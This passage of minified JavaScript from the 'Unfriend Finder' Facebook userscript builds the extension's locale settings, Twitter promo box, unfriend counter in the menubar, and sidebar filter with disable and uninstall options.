lang.fbLocales={af_ZA:"Afrikaans",id_ID:"Bahasa Indonesia",ms_MY:"Bahasa Melayu",ca_ES:"Català",cs_CZ:"Čeština",cy_GB:"Cymraeg",da_DK:"Dansk",de_DE:"Deutsch",en_GB:"English (UK)",en_US:"English (US)",en_UD:"English (Upside Down)",es_LA:"Español (Latin America)",es_ES:"Español (España)",tl_PH:"Filipino",fr_CA:"Français (Canada)",fr_FR:"Français (France)",ko_KR:"한국어",hr_HR:"Hrvatski",it_IT:"Italiano",lt_LT:"Lietuvių",hu_HU:"Magyar",nl_NL:"Nederlands",ja_JP:"日本語",nb_NO:"Norsk (bokmål)",pl_PL:"Polski",pt_BR:"Português (Brasil)",pt_PT:"Português (Portugal)",ro_RO:"Română",ru_RU:"Русский",sk_SK:"Slovenčina",sl_SI:"Slovenščina",fi_FI:"Suomi",sv_SE:"Svenska",th_TH:"ภาษาไทย",vi_VN:"Tiếng Việt",tr_TR:"Türkçe",zh_CN:"中文(简体)",zh_TW:"中文(台灣)",zh_HK:"中文(香港)",el_GR:"Ελληνικά",bg_BG:"Български",sr_RS:"Српски",he_IL:"עברית",ar_AR:"العربية",hi_IN:"हिन्दी",bn_IN:"বাংলা",pa_IN:"ਪੰਜਾਬੀ",ta_IN:"தமிழ்",te_IN:"తెలుగు",ml_IN:"മലയാളം",az_AZ:"Azərbaycan dili",bs_BA:"Bosanski",et_EE:"Eesti",en_PI:"English (Pirate)",eo_EO:"Esperanto",eu_ES:"Euskara",fo_FO:"Føroyskt",ga_IE:"Gaeilge",gl_ES:"Galego",is_IS:"Íslenska",sw_KE:"Kiswahili",ku_TR:"Kurdî",lv_LV:"Latviešu",fb_LT:"Leet Speak",la_VA:"lingua latina",nn_NO:"Norsk (nynorsk)",sq_AL:"Shqip",ka_GE:"ქართული",be_BY:"Беларуская",mk_MK:"Македонски",uk_UA:"Українська",hy_AM:"Հայերեն",fa_IR:"فارسی",ps_AF:"پښتو",ne_NP:"नेपाली",gn_PY:"Avañe'ẽ",ay_BO:"Aymar aru",jv_ID:"Basa Jawa",ck_US:"Cherokee",se_NO:"Davvisámegiella",en_IN:"English (India)",es_CL:"Español (Chile)",es_CO:"Español (Colombia)",es_MX:"Español (México)",es_VE:"Español (Venezuela)",tl_ST:"tlhIngan-Hol",li_NL:"Limburgs",mg_MG:"Malagasy fiteny",mt_MT:"Malti",nl_BE:"Nederlands (België)",uz_UZ:"O'zbek",qu_PE:"Qhichwa",rm_CH:"Rumantsch",so_SO:"Soomaaliga",fb_FI:"Suomi (koe)",si_LK:"Sinhala",tt_RU:"Tatarça",xh_ZA:"isiXhosa",zu_ZA:"isiZulu",mn_MN:"Монгол",tg_TJ:"тоҷикӣ",kk_KZ:"Қазақша",yi_DE:"ייִדיש",ur_PK:"اردو",sy_SY:"ܐܪܡܝܐ",mr_IN:"मराठी",sa_IN:"संस्कृतम्",gu_IN:"ગુજરાતી",kn_IN:"ಕನ್ನಡ",km_KH:"ភាសាខ្មែរ"};
lang.genSettings=function genSettings(){var html="",l;for(l in lang.list){if(lang.list.hasOwnProperty(l)){try{void eval("$"+l);html=html+'<tr style="background:#F2F2F2; height:27px;">    <td class="action_text">        <span style="background: url(\'https://www.unfriendfinder.com/images/'+l+".flag') no-repeat 1px 1px; padding-left:26px;\">"+lang.fbLocales[l]+'</span>    </td>    <td class="even_column">        <input type="radio" value="'+l+'" name="lang" id="'+l+'"'+(lang.language==l?' checked="checked"':"")+" />    </td></tr>"
}catch(exception){new ErrorHandler(exception,"lang.genSettings()")}}}return html};try{data=eval("$"+lang.language)}catch(exception){data=$en_US;lang.language="en_US"}Extend(lang,data);Lang.prototype.toString=function toString(){return lang.language}};var UnfriendFinderBox=function UnfriendFinderBox(){var ufbox=this;ufbox.box;ufbox.build=function UnfriendFinderBoxBuild(){trace();Console.log("Building Unfriend Finder Box");if(getFromId("pagelet_unfriendfinder")){return}ufbox.box=new xHTMLElement({element:"div",id:"pagelet_unfriendfinder",innerHTML:template.UnfriendFinderBox()}).getElement();
inject(function(){window.tweetSearch=function(response){window.reinject(function(tweets){Twitter.tweetSearch(tweets)},response)}});inject(function(){window.createTweetComments=function(response){window.reinject(function(tweet){Twitter.createTweetComments(tweet)},response)}});Console.log("Showing Unfriend Finder Box");ufbox.show();if((Params.newVersion)&&(getFromId("pagelet_newversion"))){getFromId("pagelet_newversion").innerHTML=LANG.notif_version+' <br /><a href="'+Params.links.update+'">'+LANG.here+"</a>.";
CSS3.display(getFromId("pagelet_newversion"),CSS3.DISPLAY.block)}EventMgr.addListener(getFromId("changelogLink"),EventMgr.EVENTS.click,function(){if(!core.dialogs.changelog){core.dialogs.changelog=new ContextualDialog({id:"changelog",title:"Changelog version "+Params.version,body:"Here are the main changes made in this version :<br /><br /><strong>Fixes:</strong><br />- Fixed display issues: Menubar link, broken layout in games and ads manager.<br />- Fixed cancellation of Pending Requests.<br />- False notifications should be fixed.<br />- Fixed Opera incompatibilities.<br />- Many more enhancements.<br /><br /><strong>Added:</strong><br />- Added new Social Mode with Twitter. Likes and Comments with Facebook.",context:getFromId("changelogLink"),width:450,arrow:"top-right",align:"middle",hint:'<iframe src="https://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.unfriendfinder.com%2Freleases%2F'+Params.version+'&amp;layout=button_count&amp;show_faces=true&amp;width=450&amp;action=like&amp;font=lucida+grande&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width: 100px; height: 20px; margin-top: -6px; margin-bottom: -5px;" allowtransparency="true"></iframe><a href="https://www.unfriendfinder.com/releases/'+Params.version+'" onclick="window.reinject(function() { core.dialogs[\'changelog\'].Hide(); }); window.open(this.href); return false;">More informations</a> - <a href="https://www.unfriendfinder.com/bugs/" onclick="window.open(this.href); return false">Report a bug</a>',buttons:{close:true}})
}core.dialogs.changelog.Show();EventMgr.addListener(getFromId("ttc"),EventMgr.EVENTS.click,function(){Registry.setKey(core.user_id+"_takeTour","1");core.href(Params.protocol+"//"+Params.host+"/")})});helps=eval(Registry.getKey(core.user_id+"_helps","({})"))};ufbox.show=function UnfriendFinderBoxShow(){trace();var r;if(getFromId("rightColUF")){getFromId("rightColUF").insertBefore(ufbox.box,getFromId("rightColUF").firstElementChild)}core.reValidateLang();void (r=rand(122));var s=(r%7);s=2;if(s==1){CSS3.display(getFromId("ufPageIMG"),CSS3.DISPLAY.block)
}else{if(s==2){CSS3.display(getFromId("ufTwitterIMG"),CSS3.DISPLAY.block)}else{if(s==3){CSS3.display(getFromId("ufGroupIMG"),CSS3.DISPLAY.block)}else{if(s==4){CSS3.display(getFromId("ufForumIMG"),CSS3.DISPLAY.block);CSS3.hide(getFromId("ufCommunityText"));CSS3.display(getFromId("ufForumText"),CSS3.DISPLAY.inline)}else{CSS3.display(getFromId("ufSubscribeIMG"),CSS3.DISPLAY.block);EventMgr.addListener(getFromId("ufSubscribeIMG"),EventMgr.EVENTS.click,function(){inject(function(protocol){window.open(protocol+"//www.facebook.com/profile.php?id=1364520701&sk=subscribers")
},Params.protocol)});CSS3.display(getFromId("ufSubscribeText"),CSS3.DISPLAY.block);CSS3.hide(getFromId("ufCommunityText"))}}}}Twitter.showTweets(3)};ufbox.toString=function toString(){return"[object UnfriendFinderBox]"};ufbox.build()};var Twitter={makeTwitterLinks:function(text){text=text.replace(/((#|@)([^\s#@]+))/ig,'<a href="https://twitter.com/search/$1" onclick="window.open(this.href); return false;">$1</a>');return text},makeLinks:function(text){text=text.replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig,'<a href="$1" onclick="window.open(this.href); return false;">$1</a>');
return text},showTweets:function(n){CSS3.display(getFromId("tweetIndicator"),"block");var url="https://api.twitter.com/1/statuses/user_timeline/unfriendfinder.json?callback=window.tweetSearch&count="+(n?n:3);new xHTMLElement({element:"script",src:url,parentNode:Params.head})},moreTweets:function(){var numberOfTweets=parseInt(getFromId("moreTweet").rel,10)+3;Twitter.showTweets(numberOfTweets);getFromId("moreTweet").rel=numberOfTweets},tweetSearch:function(statuses){var status;statuses.forEach(function(status){status.profile_image_url_https=status.user.profile_image_url_https;
status.text=Twitter.makeTwitterLinks(Twitter.makeLinks(status.text));if(!getFromId("tweet_"+status.id_str)){new xHTMLElement({element:"div",className:"tweet",id:"tweet_"+status.id_str,innerHTML:parseTemplate('<div style="display:none;" id="tweet_html_::id_str::">    <a onclick="window.open(this.href); return false;" href="https://twitter.com/unfriendfinder/status/::id_str::"><img src="::profile_image_url_https::" style="float: left;"></a>    <div style="margin-left: 55px; padding-top:5px;">::text::</div></div><a onclick="window.open(this.href); return false;" href="https://twitter.com/unfriendfinder/status/::id_str::"><img src="::profile_image_url_https::" style="float: left;"></a><div style="margin-left: 55px; padding-top:5px;">::text::</div><br /><iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Ftwitter.com%2Funfriendfinder%2Fstatus%2F::id_str::&amp;layout=button_count&amp;show_faces=true&amp;width=450&amp;action=like&amp;font=lucida+grande&amp;colorscheme=light&amp;height=24" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height: 24px; width: 188px; margin-left:55px;" allowTransparency="true"></iframe><br /><div style="margin-left: 55px; margin-top: -3px; margin-bottom: 3px;" id="tweet_comments_::id_str::"></div>',{params:status}),parentNode:getFromId("twitterFlow")});
Twitter.getTweetComments(status.id_str)}});CSS3.display(getFromId("tweetIndicator"),"none")},getTweetComments:function(id){var url="https://graph.facebook.com/?callback=createTweetComments&ids=https://twitter.com/unfriendfinder/status/"+id;new xHTMLElement({element:"script",src:url,parentNode:Params.head})},createTweetComments:function(tweet_url){var id,tinyid,tweet,nbcomments;for(tweet in tweet_url){if(id=tweet_url[tweet].id){nbcomments=tweet_url[tweet].comments?tweet_url[tweet].comments:0;tinyid=id.split("/").pop();
getFromId("tweet_comments_"+tinyid).innerHTML='<i style="background-position: -170px -118px; margin-bottom: -5px; margin-right: 3px; background-image: url(\'https://s-static.ak.fbcdn.net/rsrc.php/v2/yE/r/D4PppiumsVW.png\'); background-repeat: no-repeat; display: inline-block; height: 16px; width: 16px;"></i><a href="#" onclick="window.reinject(function() { Twitter.openTweetComments(\''+id+"'); }); return false;\">"+nbcomments+" comment"+(nbcomments>1?"s":"")+"</a>"}}},openTweetComments:function(id){var url="https://www.facebook.com/plugins/comments.php?href="+id;
if(core.dialogs.tweet_comments){core.dialogs.tweet_comments.Destroy()}core.dialogs.tweet_comments=new Facebox({id:"tweetFacebox",width:660,title:'<span class="en_US">Comment on @unfriendfinder\'s tweet</span><span class="fr_FR">Commenter le tweet d\'@unfriendfinder</span>',body:'<div class="tweetBoxHeader">    '+getFromId("tweet_html_"+id.replace("https://twitter.com/unfriendfinder/status/","")).innerHTML+'</div><div id="tweetbox" style="height: 350px; overflow-x:hidden;"><iframe src="'+url+'" scrolling="no" frameborder="0" style="border:none; overflow:hidden; min-height:350px; max-height: 600px; width:600px;" allowtransparency="true"></iframe></div>',buttons:[{name:"delete_story",value:"Expand",id:"reset_button",handler:function(){window.open(url)
},disabled:false,closer:true,type:"blue"},{name:"close",value:LANG.btn_close,id:"close_button",handler:function(){void (0)},disabled:false,closer:true,type:"blue"}]});core.dialogs.tweet_comments.Show();EventMgr.addListener(getFromId("tweetbox"),EventMgr.EVENTS.mousewheel,function(eArg){this.scrollTop+=(((eArg.wheelDelta||-eArg.detail)<0?1:-1)*90);eArg.preventDefault()})}};var BlueLink=function BlueLink(){var bluelink=this;bluelink.counter;bluelink.bubble;bluelink.build=function bluelinkBuild(){trace();
if(getFromId("fb_menu_unfriends")){var fb_menu_unfriends=getFromId("fb_menu_unfriends");fb_menu_unfriends.parentNode.removeChild(fb_menu_unfriends)}if(!Params.settings.hideInMenubar){if(getFromId("navAccount")){var navAccount=getFromId("navAccount"),pageNav=getFromId("navAccount").parentNode;var LI_Unfriends,DIV_jewel,DIV_Unfriends,bubble_container,A_Unfriends,SPAN_Unfriends;Console.log("Creating menubar link");EventMgr.addListener(pageNav,EventMgr.EVENTS.DOMNodeInserted,function(){var maxWidth=465,width=CSS3.getSize(getFromId("pageNav"),true).width;
if(width>maxWidth){var delta=(width-maxWidth);getFromId("q").style.width=(265-delta)+"px";getFromId("q").style.height="15px";getFromId("navSearch").style.width=(300-delta)+"px"}});var attributes=(Params.env.isFirefox?'href="'+Params.protocol+"//"+Params.host+'/?sk=unfriends" onclick="return false;"':"");LI_Unfriends=new xHTMLElement({element:"li",id:"fb_menu_unfriends",className:"topNavLink middleLink navItem middleItem",innerHTML:parseTemplate('    <div class="fbJewel hasNew">        <div id="bubble_container">            <span id="SPAN_Unfriends" class="jewelCount" style="z-index: 101; display: none;">                <span id="SPAN_Unfriends_Count">0</span>            </span>        </div>        <a id="nav_unfriends" class="topNavLink" ::attributes::>            <span id="title_unfriends">::unfriends::<span name="bubble_update" style="display:none;">&nbsp;*</span></span>        </a>    </div>',{params:{attributes:attributes,unfriends:LANG.unfriends}}),listeners:{mouseover:function(event){core.timeoutFlyoutMenubar=setTimeout(function(){if(!core.payloadFriendsOnly){return
}if(!core.dialogs.UnfriendsOver){core.dialogs.UnfriendsOver=new ContextualDialog({id:"UnfriendsOver",title:"Unfriend Finder",body:parseTemplate("Facebook database contains:<br />&nbsp;&nbsp;<b>::friends::<br />&nbsp;&nbsp;<b>::awaitings::<br /><br />Unfriend Finder detected:<br />&nbsp;&nbsp;<b>::unfriends::",{params:{friends:(core.payloadFriendsOnly.length-1)+"</b> Friends",unfriends:core.unfriends.Count()+"</b> "+LANG.unfriends,awaitings:core.keepAwaitingList.Count()+"</b> "+LANG.awaiting,}}),context:getFromId("fb_menu_unfriends"),arrow:"top-right",align:"middle",overlay:false,halo:false,margin:0,shift:0});
EventMgr.addListener(core.dialogs.UnfriendsOver.getElement(),"mouseover",function(){if(core.dialogs.UnfriendsOver.hideTimeout){clearTimeout(core.dialogs.UnfriendsOver.hideTimeout)}});EventMgr.addListener(core.dialogs.UnfriendsOver.getElement(),"mouseout",function(){core.dialogs.UnfriendsOver.hideTimeout=setTimeout(function(){if(core.dialogs.UnfriendsOver){core.dialogs.UnfriendsOver.Destroy()}},10)})}else{if(core.dialogs.UnfriendsOver.hideTimeout){clearTimeout(core.dialogs.UnfriendsOver.hideTimeout)
}}core.dialogs.UnfriendsOver.Show()},1000)},mouseout:function(event){if(!core.payloadFriendsOnly){return}if(core.dialogs.UnfriendsOver){core.dialogs.UnfriendsOver.hideTimeout=setTimeout(function(){if(core.dialogs.UnfriendsOver){core.dialogs.UnfriendsOver.Destroy()}},10)}if(core.timeoutFlyoutMenubar){clearTimeout(core.timeoutFlyoutMenubar)}}},parentNode:navAccount.parentNode,before:navAccount}).getElement();EventMgr.addListener(getFromId("nav_unfriends"),EventMgr.EVENTS.click,function(){try{if(getFromId(Params.filterName)){core.filter.select("unfriends")
}else{core.href(Params.protocol+"//"+Params.host+"/?sk=unfriends")}}catch(ex){}});bluelink.bubble=getFromId("SPAN_Unfriends");bluelink.counter=getFromId("SPAN_Unfriends_Count");var maxWidth=465,width=CSS3.getSize(getFromId("pageNav"),true).width;if(width>maxWidth){var delta=(width-maxWidth);getFromId("q").style.width=(265-delta)+"px";getFromId("q").style.height="15px";getFromId("navSearch").style.width=(300-delta)+"px"}bluelink.isCapable=true}}core.doctor.heal()};bluelink.setValue=function bluelinkSetValue(_value){if(!bluelink.isCapable){return
}trace();bluelink.counter.innerHTML=_value;CSS3.display(bluelink.bubble,(_value===0?CSS3.DISPLAY.none:CSS3.DISPLAY.block))};bluelink.toString=function toString(){return"[object BlueLink]"};bluelink.build();return bluelink};var Filter=function Filter(){var filter=this;filter.isCapable=false;if(!window.history.pushState){filter.pushState=false}filter.allowHideFromFilter={};filter.originItem=null;filter.originTitle=null;filter.blockHistoryEvent=false;filter.map={unfriends:{element:null,counter:{element:null,value:0},loadingIndicator:{element:null,loading:false}},awaitings:{element:null,counter:{element:null,value:0},loadingIndicator:{element:null,loading:false}},settings:{element:null,counter:{element:null,value:0},loadingIndicator:{element:null,loading:false}},messages:{element:null,counter:{element:null,value:0},loadingIndicator:{element:null,loading:false}}};
filter.setMap=function filterSetMap(){trace();try{filter.map.unfriends.counter.element=getFromId("bubblelink_unfriends");filter.map.awaitings.counter.element=getFromId("bubblelink_awaitings");filter.map.messages.counter.element=getFromId("bubblelink_messages");filter.map.unfriends.element=getFromId("UFfilterUnfriends");filter.map.awaitings.element=getFromId("UFfilterAwaitings");filter.map.settings.element=getFromId("UFfilterSettings");filter.map.messages.element=getFromId("UFfilterMessages");filter.map.unfriends.loadingIndicator.element=getFromId("loadingIndicatorUnfriends");
filter.map.awaitings.loadingIndicator.element=getFromId("loadingIndicatorAwaitings");filter.map.settings.loadingIndicator.element=getFromId("loadingIndicatorSettings")}catch(exception){new ErrorHandler(exception,"filter.setMap()")}finally{Console.log("Map of filter created.")}core.doctor.heal()};filter.build=function filterBuild(className){if(!getCoreFilter()){return}if(getFromId(Params.filterName)){return}trace();filter.isCapable=true;Console.log("Creating filter");var navItem_uf,previousFilter,chromeclick;
if(previousFilter=getFromId(Params.settings.previousFilter)){if(previousFilter.parentNode.parentNode!=getFromId("navItem_app_4748854339").parentNode.parentNode){delete Params.settings.previousFilter;saveSettings()}}chromeclick=(Params.env.isChrome?"onclick=\"s = document.createElement('span'); s.innerHTML = this.id; $('bindnavItem').appendChild(s); return false;\"":'onclick="return false;"');filter.html=parseTemplate('<div class="buttonWrap">   <div class="uiSelector inlineBlock mas bookmarksMenuButton uiSideNavEditButton">       <div class="wrap">           <a rel="toggle" aria-haspopup="1" role="button" href="#" class="uiSelectorButton uiCloseButton"></a>           <div class="uiSelectorMenuWrapper uiToggleFlyout">               <div class="uiMenu uiSelectorMenu" role="menu">                   <ul class="uiMenuInner">                       <li data-label="Add to Favorites" class="uiMenuItem" style="display:none;">                           <a ::onclick:: href="#" rel="ignore" role="menuitem" class="itemAnchor" id="addUnfriendstoFavNav"><span class="itemLabel fsm">Add to Favorites</span></a>                       </li>                       <li data-label="Remove from Favorites" class="uiMenuItem" style="display:none;">                           <a ::onclick:: href="#" rel="ignore" role="menuitem" class="itemAnchor" id="removeUnfriendsfromFavNav"><span class="itemLabel fsm">Remove from Favorites</span></a>                       </li>                       <li data-label="Rearrange" class="uiMenuItem rearrange">                           <a ::onclick:: href="#" rel="ignore" role="menuitem" class="itemAnchor" id="rearrangeUnfriendsNav"><span class="itemLabel fsm">Rearrange</span></a>                       </li>                       <li data-label="Edit Settings" class="uiMenuItem">                           <a ::onclick:: href="#" role="menuitem" class="itemAnchor" id="editSettingsFromFutureNav"><span class="itemLabel fsm">Edit Settings</span></a>                       </li>                       <li data-label="Disable" class="uiMenuItem">                           <a ::onclick:: href="#" role="menuitem" class="itemAnchor" id="disableUfFromFutureNav"><span class="itemLabel fsm">Disable</span></a>                       </li>                       <li data-label="Update" class="uiMenuItem" style="display:none;">                           <a href="::updatelink::" role="menuitem" class="itemAnchor" id="updateUfFromFutureNav"><span class="itemLabel fsm">Update</span></a>                       </li>                       <li data-label="Uninstall" class="uiMenuItem">                           <a href="::uninstalllink::" onclick="window.open(this.href); return false;" role="menuitem" class="itemAnchor" id="uninstallUfFromFutureNav"><span class="itemLabel fsm">Uninstall</span></a>                       </li>                   </ul>               </div>           </div>       </div>   </div></div><a ::onclick:: title="::unfriends::" href="/?sk=unfriends" class="sortableItem item" onclick="return false;" id="UFfilterUnfriends">   <div class="clearfix">      <div class="rfloat">          <span class="loadingIndicator" id="loadingIndicatorUnfriends"></span>          <span class="countValue fss uiSideNavCount" style="display:none;" id="bubblelink_unfriends">0</span>          <span class="grip"></span>      </div>      <div>          <span class="imgWrap"><i id="IconUnfriends" class="img spritemap_icons sx_app_icons_unfriends"></i></span>          <span class="linkWrap">::unfriends::<span style="display:none;" name="bubble_update">&nbsp;*</span></span>      </div>   </div></a><ul id="subitem-uf">   <li>       <a ::onclick:: title="::awaitings::" href="/?sk=requests" id="UFfilterAwaitings" class="subitem">           <div class="clearfix">               <div class="rfloat">                   <span class="loadingIndicator" id="loadingIndicatorAwaitings"></span>                   <span class="countValue fss uiSideNavCount" style="display:none;" id="bubblelink_awaitings">0</span>               </div>               <div><span class="linkChild" id="UFfilterTextAwaitings">::awaitings::</span></div>           </div>       </a>   </li>   <li>       <a ::onclick:: href="/?sk=ufs" id="UFfilterSettings" class="subitem">           <div class="clearfix">               <div class="rfloat">                   <span class="loadingIndicator" id="loadingIndicatorSettings"></span>               </div>               <div><span class="linkChild" id="UFfilterTextSettings">::settings::</span></div>           </div>       </a>   </li>   <li>       <a ::onclick:: href="/?sk=ufm" id="UFfilterMessages" class="subitem">           <div class="clearfix">               <div class="rfloat">                   <span class="loadingIndicator" id="loadingIndicatorMessages"></span>                   <span class="countValue fss uiSideNavCount" style="display:none;" id="bubblelink_messages">0</span>               </div>               <div><span class="linkChild" id="UFfilterTextMessages">::messages::</span></div>           </div>       </a>   </li></ul><span class="mover hidden_elem"></span>',{params:{updatelink:Params.links.update,uninstalllink:Params.links.uninstall,unfriends:LANG.unfriends,awaitings:LANG.awaiting,settings:LANG.settings,messages:LANG.messages,onclick:chromeclick}});
if(Params.env.isChrome){chromeclick="onclick=\"s = document.createElement('span'); s.innerHTML = this.id; $('bindnavItem').appendChild(s); return false;\"";var bindnavItem=new xHTMLElement({element:"div",id:"bindnavItem",style:{display:CSS3.DISPLAY.none},parentNode:Params.body}).getElement();EventMgr.addListener(bindnavItem,EventMgr.EVENTS.DOMNodeInserted,function(){var bindNavItemFC;if(bindNavItemFC=getFromId("bindnavItem").firstElementChild){switch(bindNavItemFC.innerHTML){case"UFfilterUnfriends":filter.select("unfriends");
core.getMessages();break;case"UFfilterAwaitings":filter.select("awaitings");break;case"UFfilterSettings":filter.select("settings");break;case"UFfilterMessages":core.filter.select("messages");break;case"removeUnfriendsfromFavNav":try{var c=getFromId(Params.filterName).className;getSideNav().removeChild(getFromId(Params.filterName));Params.settings.previousFilter="unfavorited";saveSettings();CSS3.removeClass(getFromId("appsNav").firstElementChild,"hidden_elem");core.filter.build(c)}catch(exception){new ErrorHandler(exception,"bindnavItem.DOMNodeInserted.removeUnfriendsfromFavNav")
}break;case"editSettingsFromFutureNav":try{core.filter.select("settings")}catch(exception){new ErrorHandler(exception,"bindnavItem.DOMNodeInserted.editSettingsFromFutureNav")}break;case"addUnfriendstoFavNav":try{var c=getFromId(Params.filterName).className;getSideNav().removeChild(getFromId(Params.filterName));delete Params.settings.previousFilter;saveSettings();CSS3.addClass(getFromId("appsNav").firstElementChild,"hidden_elem");core.filter.build(c)}catch(exception){new ErrorHandler(exception,"bindnavItem.DOMNodeInserted.addUnfriendstoFavNav")
}break;case"disableUfFromFutureNav":if(!core.dialogs.disableFacebox){core.dialogs.disableFacebox=new Facebox({id:"disableFacebox",title:parseTemplate('<span class="en_US">You\'re about to temporarily disable Unfriend Finder.</span><span class="fr_FR">Confirmation de désactivation temporaire du script</span>',{params:{}}),body:parseTemplate('    <span class="en_US">While disabled, the script will not alert you of any unfriend activities, and will not be displayed at this place.    <br /><br />If you want to re-enable the script, use the "Enable" function of the Icon-Button in the lower-right corner, near the Facebook Chat.    <br /><br /><b>When re-enabled, the script will alert you of all Unfriends you had when the script was disabled.</b></span>    <span class="fr_FR">Lorsque le script est désactivé, il n\'affichera aucune activité si quelqu\'un vous supprime de Facebook.    <br /><br />Si vous voulez réactiver le script par la suite, utiliser la fonction "Activer" localisée avec le bouton-icône en bas à droite, à côté de la discussion instantanée.    <br /><br /><b>Une fois réactivé, le script va vous annoncer tous les Amis en moins que vous aviez durant sa désactivation.</b></span>',{params:{}}),buttons:[{name:"delete_story",value:"Disable",id:"disable_button",handler:function(){Registry.setKey("enabled","disabled");
window.location.reload()},disabled:false,closer:false,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){core.dialogs.disableFacebox=null},disabled:false,closer:true,type:"gray"}]})}core.dialogs.disableFacebox.Show();break}getFromId("bindnavItem").removeChild(bindNavItemFC)}});navItem_uf=new xHTMLElement({element:"li",id:Params.filterName,className:(className?className:"chromenav sideNavItem closed stat_elem key-uf"),innerHTML:filter.html,parentNode:getSideNav(),after:(Params.settings.previousFilter=="unfavorited"?null:(getFromId(Params.settings.previousFilter)?getFromId(Params.settings.previousFilter):null))}).getElement();
filter.setMap()}else{navItem_uf=new xHTMLElement({element:"li",id:Params.filterName,className:(className?className:"sideNavItem closed stat_elem key-uf"),innerHTML:filter.html,parentNode:getSideNav(),after:(Params.settings.previousFilter=="unfavorited"?null:(getFromId(Params.settings.previousFilter)?getFromId(Params.settings.previousFilter):null))}).getElement();filter.setMap();filter.reBind()}filter.firstUse=true;filter.setValue({awaitings:{counter:{value:(core.keepAwaitingList.Count()||0)}}});try{window.addEventListener("hashchange",filter.handleHistory,false)
}catch(exception){new ErrorHandler(exception,"window.detectHistoryChange")}core.doctor.heal();filter.bind()};filter.bind=function filterBind(){if(!filter.isCapable){return}if(!core){return}var updateRearrangeSideNavBar;trace();filter.setValue({unfriends:{counter:{value:core.getCounter()}}},"filter.bind");if(Params.newVersion){core.filter.markUpdate()}if(Params.versionChanged){filter.map.unfriends.element.style.backgroundColor="rgb(255, 249, 215)";core.timeoutfadeFilter=setTimeout(core.startFadeFilter,2000);
Console.log("New version installed","info")}try{if(Params.settings.previousFilter!="unfavorited"){CSS3.display(getFromId("removeUnfriendsfromFavNav").parentNode,CSS3.DISPLAY.listItem);if(updateRearrangeSideNavBar=getCoreFilter().parentNode.nextElementSibling.firstElementChild){EventMgr.addListener(updateRearrangeSideNavBar,EventMgr.EVENTS.click,function(){Params.settings.previousFilter=getFromId(Params.filterName).previousElementSibling.id;saveSettings()})}}else{CSS3.display(getFromId("addUnfriendstoFavNav").parentNode,CSS3.DISPLAY.listItem);
CSS3.removeClass(getFromId("appsNav").firstElementChild,"hidden_elem")}}catch(exception){new ErrorHandler(exception,"filter.bind()")}};filter.reBind=function filterRebind(){if(!filter.isCapable){return}if(Params.env.isChrome){return}trace();EventMgr.addListener(getFromId("UFfilterUnfriends"),EventMgr.EVENTS.click,function(){core.filter.select("unfriends");core.getMessages()});EventMgr.addListener(getFromId("UFfilterAwaitings"),EventMgr.EVENTS.click,function(){core.filter.select("awaitings")});EventMgr.addListener(getFromId("UFfilterSettings"),EventMgr.EVENTS.click,function(){core.filter.select("settings")
});EventMgr.addListener(getFromId("UFfilterMessages"),EventMgr.EVENTS.click,function(){core.filter.select("messages")});EventMgr.addListener(getFromId("removeUnfriendsfromFavNav"),EventMgr.EVENTS.click,function(){try{var c=getFromId(Params.filterName).className;getSideNav().removeChild(getFromId(Params.filterName));Params.settings.previousFilter="unfavorited";saveSettings();CSS3.removeClass(getFromId("appsNav").firstElementChild,"hidden_elem");core.filter.build(c)}catch(exception){new ErrorHandler(exception,"removeUnfriendsfromFavNav.click")
}});EventMgr.addListener(getFromId("editSettingsFromFutureNav"),EventMgr.EVENTS.click,function(){try{core.filter.select("settings")}catch(exception){new ErrorHandler(exception,"editSettingsFromFutureNav.click")}});EventMgr.addListener(getFromId("addUnfriendstoFavNav"),EventMgr.EVENTS.click,function(){try{var c=getFromId(Params.filterName).className;getSideNav().removeChild(getFromId(Params.filterName));if(!getSideNav().firstElementChild){CSS3.addClass(getFromId("appsNav").firstElementChild,"hidden_elem")
}delete Params.settings.previousFilter;saveSettings();core.filter.build(c)}catch(exception){new ErrorHandler(exception,"addUnfriendstoFavNav.click")}});EventMgr.addListener(getFromId("disableUfFromFutureNav"),EventMgr.EVENTS.click,function(){if(!core.dialogs.disableFacebox){core.dialogs.disableFacebox=new Facebox({id:"disableFacebox",title:"You're about to disable Unfriend Finder.",body:parseTemplate('    While disabled, the script will not track any unfriend activities, and will not be displayed at this place.    <br /><br />If you want to re-enable the script, use the "Enable" function of the Icon-Button in the lower-right corner, near the Facebook Chat.    <br /><br />When re-enabled, the script will alert you of all Unfriends you had when the script was disabled.',{params:{}}),buttons:[{name:"delete_story",value:"Disable",id:"disable_button",handler:function(){Registry.setKey("enabled","disabled");
window.location.reload()},disabled:false,closer:false,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){core.dialogs.disableFacebox=null},disabled:false,closer:true,type:"gray"}]})}core.dialogs.disableFacebox.Show()})};filter.markUpdate=function filterMarkUpdate(){if(!filter.isCapable){return}trace();var bubbles=toArray(document.getElementsByName("bubble_update")),n;bubbles.forEach(function(bubble){CSS3.display(bubble,CSS3.DISPLAY.inline)});try{filter.map.unfriends.element.style.backgroundColor="rgb(255, 249, 215)";
if(getFromId("updateUfFromFutureNav")){CSS3.display(getFromId("updateUfFromFutureNav").parentNode,CSS3.DISPLAY.block);getFromId("updateUfFromFutureNav").firstElementChild.style.fontWeight="bold"}}catch(exception){new ErrorHandler(exception,"filter.markUpdate")}core.doctor.heal()};filter.unmarkUpdate=function filterUnMarkUpdate(){if(!filter.isCapable){return}trace();var bubbles=toArray(document.getElementsByName("bubble_update")),n;bubbles.forEach(function(bubble){CSS3.hide(bubble)});try{if(!core.timeoutfadeFilter){filter.map.unfriends.element.style.backgroundColor=""
